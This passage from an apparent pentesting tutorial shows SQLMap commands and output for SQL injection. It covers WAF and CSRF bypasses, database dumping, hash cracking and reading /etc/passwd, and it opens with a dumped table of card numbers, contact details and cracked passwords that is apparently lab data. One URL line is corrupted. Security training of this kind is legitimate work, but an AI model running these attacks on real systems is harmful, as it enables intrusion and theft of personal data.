General and operations manager                    |\n| 4  | 4929811432072262 | Gregory Stumbaugh | GregoryBStumbaugh@yahoo.com | 410-680-5653 | 1641 Marshall Street   | May 7 1936        | b7fbde78b81f7ad0b8ce0cc16b47072a6ea5f08e (spiderpig8574376) | Foreign language interpreter                      |\n| 5  | 4539646911423277 | Bobby Granger     | BobbyJGranger@gmail.com     | 212-696-1812 | 4510 Shinn Street      | December 22 1939  | aed6d83bab8d9234a97f18432cd9a85341527297 (1955chev)         | Medical records and health information technician |\n| 6  | 5143241665092174 | Kimberly Wright   | KimberlyMWright@gmail.com   | 440-232-3739 | 3136 Ralph Drive       | June 18 1972      | d642ff0feca378666a8727947482f1a4702deba0 (Enizoom1609)      | Electrologist                                     |\n| 7  | 5503989023993848 | Dean Harper       | DeanLHarper@yahoo.com       | 440-847-8376 | 3766 Flynn Street      | February 3 1974   | 2b89b43b038182f67a8b960611d73e839002fbd9 (raided)           | Store detective                                   |\n| 8  | 4556586478396094 | Gabriela Waite    | GabrielaRWaite@msn.com      | 732-638-1529 | 2459 Webster Street    | December 24 1965  | f5eb0fbdd88524f45c7c67d240a191163a27184b (ssival47)         | Telephone station installer                       |\n</code></pre> <p>SQLMap has automatic password hashes cracking capabilities. Upon retrieving any value that resembles a known hash format, SQLMap prompts us to perform a dictionary-based attack on the found hashes.</p>  DB Users Password Enumeration and Cracking <p>Apart from user credentials found in DB tables, we can also attempt to dump the content of system tables containing database-specific credentials (e.g., connection credentials). To ease the whole process, SQLMap has a special switch <code>--passwords</code> designed especially for such a task:</p> <pre><code>secops@kali[/kali]$ sqlmap -u \"http://www.example.com/?id=1\" --passwords --batch\n\n...SNIP...\n[14:25:20] [INFO] fetching database users password hashes\n[14:25:20] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique\n[14:25:20] [INFO] retrieved: 'root'\n[14:25:20] [INFO] retrieved: 'root'\n[14:25:20] [INFO] retrieved: 'root'\n[14:25:20] [INFO] retrieved: 'debian-sys-maint'\ndo you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N\n\ndo you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q] Y\n\n[14:25:20] [INFO] using hash method 'mysql_passwd'\nwhat dictionary do you want to use?\n[1] default dictionary file '/usr/local/share/sqlmap/data/txt/wordlist.tx_' (press Enter)\n[2] custom dictionary file\n[3] file with list of dictionary files\n&gt; 1\n[14:25:20] [INFO] using default dictionary\ndo you want to use common password suffixes? (slow!) [y/N] N\n\n[14:25:20] [INFO] starting dictionary-based cracking (mysql_passwd)\n[14:25:20] [INFO] starting 8 processes \n[14:25:26] [INFO] cracked password 'testpass' for user 'root'\ndatabase management system users password hashes:\n\n[*] debian-sys-maint [1]:\n    password hash: *6B2C58EABD91C1776DA223B088B601604F898847\n[*] root [1]:\n    password hash: *00E247AC5F9AF26AE0194B41E1E769DEE1429A29\n    clear-text password: testpass\n\n[14:25:28] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/www.example.com'\n\n[*] ending @ 14:25:28 /2020-09-18/\n</code></pre>  <p>The '--all' switch in combination with the '--batch' switch, will automa(g)ically do the whole enumeration process on the target itself, and provide the entire enumeration details.</p>","title":"Advanced DB Enumeration"},{"location":"tools/sqlmap/build_attacks/","text":"<p>Easiest way to properly set up an SQLMap request against the specific target is by utilizing Copy as cURL feature from within the Network (Monitor) panel inside the Chrome, Edge, or Firefox Developer Tools.</p> <p>Copy to commandline and change original curl to sqlmap</p> <pre><code>secops@kali[/kali]$ sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'\n</code></pre> <p>When providing data for testing to SQLMap, there has to be either a parameter value that could be assessed for SQLi vulnerability or specialized options/switches for automatic parameter finding (e.g. <code>--crawl</code>, <code>--forms</code> or <code>-g</code>).</p>  GET/Posts Requests <pre><code>secops@kali[/kali]$ sqlmap 'http://www.example.com/' --data 'uid=1&amp;name=test'\n</code></pre> <p>In such cases, <code>POST</code> parameters <code>uid</code> and <code>name</code> will be tested for SQLi vulnerability. For example, if we have a clear indication that the parameter <code>uid</code> is prone to an SQLi vulnerability, we could narrow down the tests to only this parameter using <code>-p uid</code>. Otherwise, we could mark it inside the provided data with the usage of special marker <code>*</code> as follows:</p> <pre><code>secops@kali[/kali]$ sqlmap 'http://www.example.com/' --data 'uid=1*&amp;name=test'\n</code></pre>  Full HTTP Requests <p>If we need to specify a complex HTTP request with lots of different header values and an elongated POST body, we can use the <code>-r</code> flag. Capture HTTP Request with e.g. <code>Burp</code>.</p> <p>Example Capture with <code>Burp</code> <pre><code>GET /?id=1 HTTP/1.1\nHost: www.example.com\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\nDNT: 1\nIf-Modified-Since: Thu, 17 Oct 2019 07:18:26 GMT\nIf-None-Match: \"3147526947\"\nCache-Control: max-age=0\n</code></pre></p> <p>Manually copy the HTTP request from within <code>Burp</code> and write it to a file, or right-click the request within <code>Burp</code> and choose <code>Copy to file</code>.</p> <p>To run SQLMap with an HTTP request file, use the <code>-r</code> flag:</p> <pre><code>secops@kali[/kali]$ sqlmap -r req.txt\n        ___\n       __H__\n ___ ___[\"]_____ ___ ___  {1.4.9}\n|_ -| . [(]     | .'| . |\n|___|_  [.]_|_|_|__,|  _|\n      |_|V...       |_|   http://sqlmap.org\n\n\n[*] starting @ 14:32:59 /2020-09-11/\n\n[14:32:59] [INFO] parsing HTTP request from 'req.txt'\n[14:32:59] [INFO] testing connection to the target URL\n[14:32:59] [INFO] testing if the target URL content is stable\n[14:33:00] [INFO] target URL content is stable\n</code></pre>  <p>Note: use <code>--batch --dump</code> to dump all findings.</p>   Handling SQLMap Errors Display Errors <p>The first step is usually to switch the <code>--parse-errors</code>, to parse the DBMS errors (if any) and displays them as part of the program run:</p> <pre><code>...SNIP...\n[16:09:20] [INFO] testing if GET parameter 'id' is dynamic\n[16:09:20] [INFO] GET parameter 'id' appears to be dynamic\n[16:09:20] [WARNING] parsed DBMS error message: 'SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '))\"',),)((' at line 1'\"\n[16:09:20] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')\n[16:09:20] [WARNING] parsed DBMS error message: 'SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''YzDZJELylInm' at line 1'\n...SNIP...\n</code></pre> <p>With this option, SQLMap will automatically print the DBMS error, thus giving us clarity on what the issue may be so that we can properly fix it.</p> Store the Traffic <p>The <code>-t</code> option stores the whole traffic content to an output file:</p> <pre><code>secops@kali[/kali]$ sqlmap -u \"http://www.target.com/vuln.php?id=1\" --batch -t /tmp/traffic.txt\n\nsecops@kali[/kali]$ cat /tmp/traffic.txt\nHTTP request [#1]:\nGET /?id=1 HTTP/1.1\nHost: www.example.com\nCache-control: no-cache\nAccept-encoding: gzip,deflate\nAccept: */*\nUser-agent: sqlmap/1.4.9 (http://sqlmap.org)\nConnection: close\n\nHTTP response [#1] (200 OK):\nDate: Thu, 24 Sep 2020 14:12:50 GMT\nServer: Apache/2.4.41 (Ubuntu)\nVary: Accept-Encoding\nContent-Encoding: gzip\nContent-Length: 914\nConnection: close\nContent-Type: text/html; charset=UTF-8\nURI: http://www.example.com:80/?id=1\n\n&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n...SNIP...\n</code></pre> <p>As we can see from the above output, the <code>/tmp/traffic.txt</code> file now contains all sent and received HTTP requests. So, we can now manually investigate these requests to see where the issue is occurring.</p> Verbose Output <p><code>-v</code> option, which raises the verbosity level of the console output:</p> <pre><code>secops@kali[/kali]$ sqlmap -u \"http://www.target.com/vuln.php?id=1\" -v 6 --batch\n        ___\n       __H__\n ___ ___[,]_____ ___ ___  {1.4.9}\n|_ -| . [(]     | .'| . |\n|___|_  [(]_|_|_|__,|  _|\n      |_|V...       |_|   http://sqlmap.org\n\n\n[*] starting @ 16:17:40 /2020-09-24/\n\n[16:17:40] [DEBUG] cleaning up configuration parameters\n[16:17:40] [DEBUG] setting the HTTP timeout\n[16:17:40] [DEBUG] setting the HTTP User-Agent header\n[16:17:40] [DEBUG] creating HTTP requests opener object\n[16:17:40] [DEBUG] resolving hostname 'www.example.com'\n[16:17:40] [INFO] testing connection to the target URL\n[16:17:40] [TRAFFIC OUT] HTTP request [#1]:\nGET /?id=1 HTTP/1.1\nHost: www.example.com\nCache-control: no-cache\nAccept-encoding: gzip,deflate\nAccept: */*\nUser-agent: sqlmap/1.4.9 (http://sqlmap.org)\nConnection: close\n\n[16:17:40] [DEBUG] declared web page charset 'utf-8'\n[16:17:40] [TRAFFIC IN] HTTP response [#1] (200 OK):\nDate: Thu, 24 Sep 2020 14:17:40 GMT\nServer: Apache/2.4.41 (Ubuntu)\nVary: Accept-Encoding\nContent-Encoding: gzip\nContent-Length: 914\nConnection: close\nContent-Type: text/html; charset=UTF-8\nURI: http://www.example.com:80/?id=1\n\n&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n\n&lt;head&gt;\n  &lt;meta charset=\"utf-8\"&gt;\n  &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\"&gt;\n  &lt;meta name=\"description\" content=\"\"&gt;\n  &lt;meta name=\"author\" content=\"\"&gt;\n  &lt;link href=\"vendor/bootstrap/css/bootstrap.min.css\" rel=\"stylesheet\"&gt;\n  &lt;title&gt;SQLMap Essentials - Case1&lt;/title&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n...SNIP...\n</code></pre> Using Proxy <p>Utilize the <code>--proxy</code> option to redirect the whole traffic through a (MiTM) proxy (e.g., <code>Burp</code>). This will route all SQLMap traffic through <code>Burp</code>, so that we can later manually investigate all requests, repeat them, and utilize all features of <code>Burp</code> with these requests:</p>  Tuning Level/Risk <p>By default, SQLMap combines a predefined set of most common boundaries (i.e., prefix/suffix pairs), along with the vectors having a high chance of success in case of a vulnerable target. Nevertheless, there is a possibility for users to use bigger sets of boundaries and vectors, already incorporated into the SQLMap.</p> <ul> <li> <p>The option <code>--level</code> (<code>1-5</code>, default <code>1</code>) extends both vectors and boundaries being used, based on their expectancy of success (i.e., the lower the expectancy, the higher the level).</p> </li> <li> <p>The option <code>--risk</code> (<code>1-3</code>, default <code>1</code>) extends the used vector set based on their risk of causing problems at the target side (i.e., risk of database entry loss or denial-of-service).</p> </li> </ul> <p>The best way to check for differences between used boundaries and payloads for different values of <code>--level</code> and <code>--risk</code>, is the usage of <code>-v</code> option to set the verbosity level. In verbosity 3 or higher (e.g. <code>-v 3</code>), messages containing the used <code>[PAYLOAD]</code> will be displayed:</p> <pre><code>secops@kali[/kali]$ sqlmap -u www.example.com/?id=1 -v 3 --level=5\n\n...SNIP...\n[14:17:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'\n[14:17:07] [PAYLOAD] 1) AND 5907=7031-- AuiO\n[14:17:07] [PAYLOAD] 1) AND 7891=5700 AND (3236=3236\n...SNIP...\n[14:17:07] [PAYLOAD] 1')) AND 1049=6686 AND (('OoWT' LIKE 'OoWT\n[14:17:07] [PAYLOAD] 1'))) AND 4534=9645 AND ((('DdNs' LIKE 'DdNs\n[14:17:07] [PAYLOAD] 1%' AND 7681=3258 AND 'hPZg%'='hPZg\n...SNIP...\n[14:17:07] [PAYLOAD] 1\")) AND 4540=7088 AND ((\"hUye\"=\"hUye\n[14:17:07] [PAYLOAD] 1\"))) AND 6823=7134 AND (((\"aWZj\"=\"aWZj\n[14:17:07] [PAYLOAD] 1\" AND 7613=7254 AND \"NMxB\"=\"NMxB\n...SNIP...\n[14:17:07] [PAYLOAD] 1\"=\"1\" AND 3219=7390 AND \"1\"=\"1\n[14:17:07] [PAYLOAD] 1' IN BOOLEAN MODE) AND 1847=8795#\n[14:17:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'\n</code></pre> <p>On the other hand, payloads used with the default <code>--level</code> value have a considerably smaller set of boundaries:</p> <pre><code>secops@kali[/kali]$ sqlmap -u www.example.com/?id=1 -v 3\n...SNIP...\n[14:20:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'\n[14:20:36] [PAYLOAD] 1) AND 2678=8644 AND (3836=3836\n[14:20:36] [PAYLOAD] 1 AND 7496=4313\n[14:20:36] [PAYLOAD] 1 AND 7036=6691-- DmQN\n[14:20:36] [PAYLOAD] 1') AND 9393=3783 AND ('SgYz'='SgYz\n[14:20:36] [PAYLOAD] 1' AND 6214=3411 AND 'BhwY'='BhwY\n[14:20:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'\n</code></pre> <p>As for vectors, we can compare used payloads as follows:</p> <pre><code>secops@kali[/kali]$ sqlmap -u www.example.com/?id=1\n...SNIP...\n[14:42:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'\n[14:42:38] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'\n[14:42:38] [INFO] testing 'MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'\n...SNIP...\n</code></pre> <pre><code>secops@kali[/kali]$ sqlmap -u www.example.com/?id=1 --level=5 --risk=3\n\n...SNIP...\n[14:46:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'\n[14:46:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'\n[14:46:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'\n...SNIP...\n[14:46:05] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'\n[14:46:05] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'\n[14:46:05] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'\n...SNIP...\n[14:46:05] [INFO] testing 'MySQL &lt; 5.0 boolean-based blind - ORDER BY, GROUP BY clause'\n[14:46:05] [INFO] testing 'MySQL &lt; 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'\n[14:46:05] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'\n...SNIP...\n[14:46:05] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'\n[14:46:06] [INFO] testing 'MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'\n[14:46:06] [INFO] testing 'MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (EXP)'\n...SNIP...\n</code></pre> <p>It will make the whole detection process considerably slower.</p> Advanced Tuning Status Codes <p>For example, when dealing with a huge target response with a lot of dynamic content, subtle differences between <code>TRUE</code> and <code>FALSE</code> responses could be used for detection purposes. If the difference between <code>TRUE</code> and <code>FALSE</code> responses can be seen in the HTTP codes (e.g. <code>200</code> for <code>TRUE</code> and <code>500</code> for <code>FALSE</code>), the option <code>--code</code> could be used to fixate the detection of <code>TRUE</code> responses to a specific HTTP code (e.g. <code>--code=200</code>).</p> Titles <p>If the difference between responses can be seen by inspecting the HTTP page titles, the switch <code>--titles</code> could be used to instruct the detection mechanism to base the comparison based on the content of the HTML tag <code>&lt;title&gt;</code>.</p> Strings <p>In case of a specific string value appearing in <code>TRUE</code> responses (e.g. <code>success</code>), while absent in <code>FALSE</code> responses, the option <code>--string</code> could be used to fixate the detection based only on the appearance of that single value (e.g. <code>--string=success</code>).</p> Text-only <p>When dealing with a lot of hidden content, such as certain HTML page behaviors tags (e.g. <code>&lt;script&gt;</code>, <code>&lt;style&gt;</code>, <code>&lt;meta&gt;</code>, etc.), we can use the <code>--text-only</code> switch, which removes all the HTML tags, and bases the comparison only on the textual (i.e., visible) content.</p> Techniques <p>In some special cases, we have to narrow down the used payloads only to a certain type. For example, if the time-based blind payloads are causing trouble in the form of response timeouts, or if we want to force the usage of a specific SQLi payload type, the option <code>--technique</code> can specify the SQLi technique to be used.</p> <p>For example, if we want to skip the time-based blind and stacking SQLi payloads and only test for the boolean-based blind, error-based, and UNION-query payloads, we can specify these techniques with <code>--technique=BEU</code>.</p> UNION SQLi Tuning <p>In some cases, <code>UNION</code> SQLi payloads require extra user-provided information to work. If we can manually find the exact number of columns of the vulnerable SQL query, we can provide this number to SQLMap with the option <code>--union-cols</code> (e.g. <code>--union-cols=17</code>). In case that the default \"dummy\" filling values used by SQLMap -<code>NULL</code> and random integer- are not compatible with values from results of the vulnerable SQL query, we can specify an alternative value instead (e.g. <code>--union-char='a'</code>).</p> <p>Furthermore, in case there is a requirement to use an appendix at the end of a <code>UNION</code> query in the form of the <code>FROM &lt;table&gt;</code> (e.g., in case of Oracle), we can set it with the option <code>--union-from</code> (e.g. <code>--union-from=users</code>). Failing to use the proper <code>FROM</code> appendix automatically could be due to the inability to detect the DBMS name before its usage.</p>","title":"Building Attacks"},{"location":"tools/sqlmap/bypassing_web_protections/","text":"Anti-CSRF Token Bypass <pre><code>secops@kali[/kali]$ sqlmap -u \"http://www.example.com/\" --data=\"id=1&amp;csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE\" --csrf-token=\"csrf-token\"\n\n        ___\n       __H__\n ___ ___[,]_____ ___ ___  {1.4.9}\n|_ -| . [']     | .'| . |\n|___|_  [)]_|_|_|__,|  _|\n      |_|V...       |_|   http://sqlmap.org\n\n[*] starting @ 22:18:01 /2020-09-18/\n\nPOST parameter 'csrf-token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] y\n</code></pre>  Unique Value Bypass <p>The option <code>--randomize</code> should be used, pointing to the parameter name containing a value which should be randomized before being sent:</p> <pre><code>secops@kali[/kali]$ sqlmap -u \"http://www.example.com/?id=1&amp;rp=29125\" --randomize=rp --batch -v 5 | grep URI\n\nURI: http://www.example.com:80/?id=1&amp;rp=99954\nURI: http://www.example.com:80/?id=1&amp;rp=87216\nURI: http://www.example.com:80/?id=9030&amp;rp=36456\nURI: http://www.example.com:80/?id=1.%2C%29%29%27.%28%28%2C%22&amp;rp=16689\nURI: http://www.example.com:80/?id=1%27xaFUVK%3C%27%22%3EHKtQrg&amp;rp=40049\nURI: http://www.example.com:80/?id=1%29%20AND%209368%3D6381%20AND%20%287422%3D7422&amp;rp=95185\n</code></pre>  Calculated Parameter Bypass <p>Most often, one parameter value has to contain the message digest (e.g. <code>h=MD5(id)</code>) of another one. To bypass this, the option <code>--eval</code> should be used, where a valid Python code is being evaluated just before the request is being sent to the target:</p> <pre><code>secops@kali[/kali]$ sqlmap -u \"http://www.example.com/?id=1&amp;h=c4ca4238a0b923820dcc509a6f75849b\" --eval=\"import hashlib; h=hashlib.md5(id).hexdigest()\" --batch -v 5 | grep URI\n\nURI: http://www.example.com:80/?id=1&amp;h=c4ca4238a0b923820dcc509a6f75849b\nURI: http://www.example.com:80/?id=1&amp;h=c4ca4238a0b923820dcc509a6f75849b\nURI: http://www.example.com:80/?id=9061&amp;h=4d7e0d72898ae7ea3593eb5ebf20c744\nURI: http://www.example.com:80/?id=1%2C.%2C%27%22.%2C%28.%29&amp;h=620460a56536e2d32fb2f4842ad5a08d\nURI: http://www.example.com:80/?id=1%27MyipGP%3C%27%22%3EibjjSu&amp;h=db7c815825b14d67aaa32da09b8b2d42\nURI: http://www.example.com:80/?id=1%29%20AND%209978%socks4://177.39.187.70:33283ssocks4://177.39.187.70:332833D1232%20AND%20%284955%3D4955&amp;h=02312acd4ebe69e2528382dfff7fc5cc\n</code></pre>  IP Address Concealing <p>In case we want to conceal our IP address, or if a certain web application has a protection mechanism that blacklists our current IP address, we can try to use a proxy or the anonymity network Tor. A proxy can be set with the option <code>--proxy</code> (e.g. <code>--proxy=\"socks4://177.39.187.70:33283\"</code>), where we should add a working proxy.</p> <p>If we wanted to be sure that Tor is properly being used, to prevent unwanted behavior, we could use the switch <code>--check-tor</code>. In such cases, SQLMap will connect to the <code>https://check.torproject.org/</code> and check the response for the intended result (i.e., <code>Congratulations</code> appears inside).</p>  WAF Bypass <p>Whenever we run SQLMap, As part of the initial tests, SQLMap sends a predefined malicious looking payload using a non-existent parameter name (e.g. <code>?pfov=...</code>) to test for the existence of a WAF (Web Application Firewall). </p> <p>In case of a positive detection, to identify the actual protection mechanism, SQLMap uses a third-party library identYwaf, containing the signatures of 80 different WAF solutions. If we wanted to skip this heuristical test altogether (i.e., to produce less noise), we can use switch <code>--skip-waf</code>.</p>  User-agent Blacklisting Bypass <p>This is trivial to bypass with the switch <code>--random-agent</code>, which changes the default user-agent with a randomly chosen value from a large pool of values used by browsers.</p>  Tamper Scripts <p>One of the most popular mechanisms implemented in SQLMap for bypassing WAF/IPS solutions is the so-called \"tamper\" scripts. </p> <p>For example, one of the most popular tamper scripts between is replacing all occurrences of greater than operator (<code>&gt;</code>) with <code>NOT BETWEEN 0 AND #</code>, and the equals operator (<code>=</code>) with <code>BETWEEN # AND #</code>. This way, many primitive protection mechanisms (focused mostly on preventing XSS attacks) are easily bypassed, at least for SQLi purposes.</p> <p>Tamper scripts can be chained, one after another, within the <code>--tamper</code> option (e.g. <code>--tamper=between,randomcase</code>), where they are run based on their predefined priority. A priority is predefined to prevent any unwanted behavior, as some scripts modify payloads by modifying their SQL syntax (e.g. ifnull2ifisnull). In contrast, some tamper scripts do not care about the inner content (e.g. appendnullbyte).</p> <p>To get a whole list of implemented tamper scripts, along with the description as above, switch <code>--list-tampers</code> can be used.</p>  Miscellaneous Bypasses <p>The first one is the Chunked transfer encoding, turned on using the switch <code>-chunked</code>, which splits the POST request's body into so-called \"chunks.\" Blacklisted SQL keywords are split between chunks in a way that the request containing them can pass unnoticed.</p> <p>The other bypass mechanisms is the <code>HTTP parameter pollution</code> (<code>HPP</code>), where payloads are split in a similar way as in case of <code>--chunked</code> between different same parameter named values (e.g. <code>?id=1&amp;id=UNION&amp;id=SELECT&amp;id=username,password&amp;id=FROM&amp;id=users...</code>), which are concatenated by the target platform if supporting it (e.g. <code>ASP</code>).</p>","title":"Bypassing Web App Protections"},{"location":"tools/sqlmap/db_enumeration/","text":"Basic DB Data Enumeration <p>Enumeration usually starts with the retrieval of the basic information:</p> <ul> <li>Database version banner (switch <code>--banner</code>)</li> <li>Current user name (switch <code>--current-user</code>)</li> <li>Current database name (switch <code>--current-db</code>)</li> <li>Checking if the current user has DBA (administrator) rights.</li> </ul> <pre><code>secops@kali[/kali]$ sqlmap -u \"http://www.example.com/?id=1\" --banner --current-user --current-db --is-dba\n\n        ___\n       __H__\n ___ ___[']_____ ___ ___  {1.4.9}\n|_ -| . [']     | .'| . |\n|___|_  [.]_|_|_|__,|  _|\n      |_|V...       |_|   http://sqlmap.org\n\n\n[*] starting @ 13:30:57 /2020-09-17/\n\n[13:30:57] [INFO] resuming back-end DBMS 'mysql' \n[13:30:57] [INFO] testing connection to the target URL\nsqlmap resumed the following injection point(s) from stored session:\n---\nParameter: id (GET)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause\n    Payload: id=1 AND 5134=5134\n\n    Type: error-based\n    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)\n    Payload: id=1 AND (SELECT 5907 FROM(SELECT COUNT(*),CONCAT(0x7170766b71,(SELECT (ELT(5907=5907,1))),0x7178707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 3 columns\n    Payload: id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x7170766b71,0x7a76726a6442576667644e6b476e577665615168564b7a696a6d4646475159716f784f5647535654,0x7178707671)-- -\n---\n[13:30:57] [INFO] the back-end DBMS is MySQL\n[13:30:57] [INFO] fetching banner\nweb application technology: PHP 5.2.6, Apache 2.2.9\nback-end DBMS: MySQL &gt;= 5.0\nbanner: '5.1.41-3~bpo50+1'\n[13:30:58] [INFO] fetching current user\ncurrent user: 'root@%'\n[13:30:58] [INFO] fetching current database\ncurrent database: 'testdb'\n[13:30:58] [INFO] testing if current user is DBA\n[13:30:58] [INFO] fetching current user\ncurrent user is DBA: True\n[13:30:58] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/www.example.com'\n\n[*] ending @ 13:30:58 /2020-09-17/\n</code></pre> <p>We can see that the database version is quite old (MySQL 5.1.41 - from November 2009), and the current user name is <code>root</code>, while the current database name is <code>testdb</code>.</p>  <p>Note: The 'root' user in the database context in the vast majority of cases does not have any relation with the OS user \"root\", other than that representing the privileged user within the DBMS context. This basically means that the DB user should not have any constraints within the database context, while OS privileges (e.g. file system writing to arbitrary location) should be minimalistic, at least in the recent deployments. The same principle applies for the generic 'DBA' role.</p>   Table Enumeration <p>After finding the current database name (i.e. <code>testdb</code>), the retrieval of table names would be by using the <code>--tables</code> option and specifying the DB name with <code>-D testdb</code>:</p> <pre><code>secops@kali[/kali]$ sqlmap -u \"http://www.example.com/?id=1\" --tables -D testdb\n\n...SNIP...\n[13:59:24] [INFO] fetching tables for database: 'testdb'\nDatabase: testdb\n[4 tables]\n+---------------+\n| member        |\n| data          |\n| international |\n| users         |\n+---------------+\n</code></pre> <p>Retrieval of its content can be done by using the <code>--dump</code> option and specifying the table name with <code>-T users</code>:</p> <pre><code>secops@kali[/kali]$ sqlmap -u \"http://www.example.com/?id=1\" --dump -T users -D testdb\n\n...SNIP...\nDatabase: testdb\n\nTable: users\n[4 entries]\n+----+--------+------------+\n| id | name   | surname    |\n+----+--------+------------+\n| 1  | luther | blisset    |\n| 2  | fluffy | bunny      |\n| 3  | wu     | ming       |\n| 4  | NULL   | nameisnull |\n+----+--------+------------+\n\n[14:07:18] [INFO] table 'testdb.users' dumped to CSV file '/home/user/.local/share/sqlmap/output/www.example.com/dump/testdb/users.csv'\n</code></pre>  <p>Apart from default CSV, we can specify the output format with the option <code>--dump-format</code> to HTML or SQLite, so that we can later further investigate the DB in an SQLite environment.</p>   Table/Row Enumeration <p>When dealing with large tables with many columns and/or rows, we can specify the columns (e.g., only <code>name</code> and <code>surname</code> columns) with the <code>-C</code> option:</p> <pre><code>secops@kali[/kali]$ sqlmap -u \"http://www.example.com/?id=1\" --dump -T users -D testdb -C name,surname\n\n...SNIP...\nDatabase: testdb\n\nTable: users\n[4 entries]\n+--------+------------+\n| name   | surname    |\n+--------+------------+\n| luther | blisset    |\n| fluffy | bunny      |\n| wu     | ming       |\n| NULL   | nameisnull |\n+--------+------------+\n</code></pre> <p>To narrow down the rows based on their ordinal number(s) inside the table, we can specify the rows with the <code>--start</code> and <code>--stop</code> options (e.g., start from 2nd up to 3rd entry):</p> <pre><code>secops@kali[/kali]$ sqlmap -u \"http://www.example.com/?id=1\" --dump -T users -D testdb --start=2 --stop=3\n\n...SNIP...\nDatabase: testdb\n\nTable: users\n[2 entries]\n+----+--------+---------+\n| id | name   | surname |\n+----+--------+---------+\n| 2  | fluffy | bunny   |\n| 3  | wu     | ming    |\n+----+--------+---------+\n</code></pre>  Conditional Enumeration <p>If there is a requirement to retrieve certain rows based on a known <code>WHERE</code> condition (e.g. <code>name LIKE 'f%'</code>), we can use the option <code>--where</code>:</p> <pre><code>secops@kali[/kali]$ sqlmap -u \"http://www.example.com/?id=1\" --dump -T users -D testdb --where=\"name LIKE 'f%'\"\n\n...SNIP...\nDatabase: testdb\n\nTable: users\n[1 entry]\n+----+--------+---------+\n| id | name   | surname |\n+----+--------+---------+\n| 2  | fluffy | bunny   |\n+----+--------+---------+\n</code></pre>  Full DB Enumeration <p>Instead of retrieving content per single-table basis, we can retrieve all tables inside the database of interest by skipping the usage of option <code>-T</code> altogether (e.g. <code>--dump -D testdb</code>). By using the switch <code>--dump</code> without specifying a table with <code>-T</code>, all of the current database content will be retrieved. As for the <code>--dump-all</code> switch, all the content from all the databases will be retrieved.</p> <p>In such cases, a user is also advised to include the switch <code>--exclude-sysdbs</code> (e.g. <code>--dump-all --exclude-sysdbs</code>), which will instruct SQLMap to skip the retrieval of content from system databases, as it is usually of little interest for pentesters.</p>","title":"DB Enumeration"},{"location":"tools/sqlmap/os_exploitation/","text":"Checking for DBA Privileges <pre><code>secops@kali[/kali]$ sqlmap -u \"http://www.example.com/case1.php?id=1\" --is-dba\n\n        ___\n       __H__\n ___ ___[)]_____ ___ ___  {1.4.11#stable}\n|_ -| . [)]     | .'| . |\n|___|_  [\"]_|_|_|__,|  _|\n      |_|V...       |_|   http://sqlmap.org\n\n[*] starting @ 17:31:55 /2020-11-19/\n\n[17:31:55] [INFO] resuming back-end DBMS 'mysql'\n[17:31:55] [INFO] testing connection to the target URL\nsqlmap resumed the following injection point(s) from stored session:\n...SNIP...\ncurrent user is DBA: False\n\n[*] ending @ 17:31:56 /2020-11-19\n</code></pre> <p>If we tried to read a file using SQLMap, we would get something like:</p> <pre><code>[17:31:43] [INFO] fetching file: '/etc/passwd'\n[17:31:43] [ERROR] no data retrieved\n</code></pre>  Reading Local Files <p>.. let's say we have DBA privileges</p> <pre><code>secops@kali[/kali]$ sqlmap -u \"http://www.example.com/?id=1\" --file-read \"/etc/passwd\"\n\n        ___\n       